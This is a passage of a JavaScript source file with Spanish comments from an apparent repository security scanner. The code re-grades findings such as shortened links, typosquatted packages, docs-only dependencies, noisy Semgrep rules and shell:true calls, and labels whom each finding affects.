    const code = /^(github\.com|raw\.githubusercontent\.com|gist\.githubusercontent\.com|gitlab\.com)$/i.test(dest.hostname) && !/\.(exe|zip|rar|7z|msi|scr|dmg|pkg|apk)$/i.test(dest.pathname);
    if (code && ['critical', 'high'].includes(f.severity)) note(f, 'medium', `Revisado: el enlace acortado lleva a ${r.finalUrl}, código que se puede leer antes de usarlo.`);
    else f.description += ` El enlace acortado lleva a ${r.finalUrl}.`;
    stats.remote++;
  }

  // 4. Typosquatting: ¿existe desde hace años?
  const typos = out.threats.filter((f) => f.rule === 'typosquat' && f.pkg);
  if (typos.length && online && !late()) {
    await Promise.all(typos.slice(0, 20).map(async (f) => {
      let age = null;
      try { age = await packageAge(f.pkg.ecosystem, f.pkg.name); } catch { /* sin red */ }
      if (!age) return;
      const years = (Date.now() - age.first) / (365.25 * 86400e3);
      const since = new Date(age.first).getFullYear();
      if (years >= 2) note(f, 'info', `Revisado: el paquete existe desde ${since} con ${age.versions} versiones; el nombre parecido no es un typosquat reciente.`);
      else if (years < 0.5) note(f, 'high', `Revisado: el paquete se publicó por primera vez hace ${Math.max(1, Math.round(years * 12))} mes(es).`);
      else note(f, 'medium', `Revisado: el paquete existe desde ${since}.`);
      stats.typosquat++;
    }));
  }

  // Dependencias de la web de documentación o de los ejemplos: no llegan a quien usa el proyecto
  for (const v of out.vulns) {
    if (v.rule === 'dep-vuln' && v.file && /(^|\/)(docs?|website|site|examples?|demos?|benchmarks?|playgrounds?)\//i.test(v.file) && !v.dev) {
      v.severity = { critical: 'medium', high: 'medium', medium: 'low' }[v.severity] || v.severity;
      v.title += ' (solo en docs o ejemplos)';
      stats.docsDeps++;
    }
  }
  // "- ALL" debajo de cap_drop es quitar todas las capacidades: es el endurecimiento, no un fallo.
  out.vulns = out.vulns.filter((v) => {
    if (v.rule !== 'compose-cap-add' || !v.line) return true;
    const l = lineOf(root, v.file, v.line, cache);
    if (!l || /cap_add/.test(l.text)) return true;
    for (let i = v.line - 2; i >= 0 && i >= v.line - 30; i--) {
      if (/^\s*-/.test(l.all[i])) continue;
      return !/^\s*cap_drop\s*:/.test(l.all[i]);
    }
    return true;
  });

  // Reglas de Semgrep muy generales: marcan cualquier ruta, expresión regular o formato construido
  // con una variable. Sirven al autor para revisar su código; a ti, poco.
  for (const v of out.vulns) {
    if (v.rule === 'ext-semgrep' && SEMGREP_NOISY.test(v.title) && ['high', 'medium'].includes(v.severity)) {
      note(v, 'low', 'Revisado: es una regla general de Semgrep que marca cualquier ruta o patrón construido con una variable; solo es un fallo si llega un dato de fuera sin validar.');
      stats.noisy = (stats.noisy || 0) + 1;
    }
  }

  // shell: true con un comando fijo (lanzar npm/npx en Windows, donde son .cmd): sin datos de fuera
  // en la orden no hay inyección.
  for (const v of out.vulns) {
    if (v.rule !== 'ext-semgrep' || !/^spawn-shell-true /.test(v.title) || !v.line || !['high', 'medium'].includes(v.severity)) continue;
    const l = lineOf(root, v.file, v.line, cache);
    if (!l) continue;
    const near = l.all.slice(Math.max(0, v.line - 6), v.line + 3).join('\n');
    const call = near.match(/\bspawn(?:Sync)?\(\s*(["'`])[\w./-]+\1\s*,\s*\[([^\]]*)\]/);
    const literals = call && call[2].split(',').every((a) => !a.trim() || /^\s*(["'])[^"'$`]*\1\s*$/.test(a));
    const winOnly = /shell\s*:\s*(process\.platform\s*===?\s*["']win32["']|isWin\w*)/.test(near);
    if (literals) note(v, 'low', 'Revisado: la orden y sus argumentos son fijos (no entra ningún dato de fuera), así que la shell no permite inyectar nada.');
    else if (winOnly && v.severity === 'high') note(v, 'medium', 'Revisado: la shell solo se usa en Windows (para lanzar .cmd como npm); solo es un fallo si en los argumentos entra un dato de fuera.');
  }

  // ---------- 6. ¿A quién afecta? ----------
  // La herramienta protege a quien clona el repo. Cada aviso dice cuándo te afectaría a ti, y lo
  // que solo afecta al autor (sus claves, su CI) o a quien lo despliegue no cuenta igual.
  for (const v of out.vulns) {
    v.impact = vulnImpact(v);
    if (v.impact === 'author' && !['info', 'low'].includes(v.severity)) {
      const ci = CI_PATH.test(v.file || '');
      const example = !ci && (/REDACTED|example|placeholder|xxxx|changeme|your[_-]?(key|token|secret)/i.test(String(v.snippet || '')) || /(^|\/)(openapi|swagger)[^/]*\.(ya?ml|json)$|(^|\/)openapi[^/]*\//i.test(v.file || ''));
      note(v, ci || example ? 'info' : 'low', ci
        ? 'No te afecta al clonarlo: se ejecuta en el CI del autor (GitHub Actions), no en tu máquina. Solo importaría si haces un fork y activas sus Actions.'
        : example
          ? 'No te afecta: es un valor de ejemplo en la documentación de la API, no una credencial real.'
          : 'No te afecta al clonarlo: es la credencial del autor la que queda expuesta. Solo te importa si usas el proyecto con ese valor tal cual (cámbialo).');
      stats.author = (stats.author || 0) + 1;
    } else if (v.impact === 'docs' && ['critical', 'high', 'medium'].includes(v.severity)) {
      note(v, 'low', 'Está en la web de documentación del proyecto: afecta a quien visite esa web publicada, no a lo que tú clonas o ejecutas.');
      stats.docsSite = (stats.docsSite || 0) + 1;
    } else if (v.impact === 'deploy' && ['critical', 'high', 'medium'].includes(v.severity)) {
      note(v, 'low', 'Solo te afecta si despliegas el proyecto con estos ficheros (Kubernetes, Helm, Terraform…); al clonarlo o ejecutarlo en tu equipo no se usan.');
      stats.deploy = (stats.deploy || 0) + 1;
    }
  }
  for (const t of out.threats) t.impact = t.impact || threatImpact(t);

  return { coverage, stats };
}

// A quién afecta un aviso (lo usa también la demo de la página)
const impactOf = (f) => (f.kind === 'vuln' ? vulnImpact(f) : threatImpact(f));

module.exports = { review, impactOf, reservedIp, insideString, TEST_PATH, VENDOR_PATH };
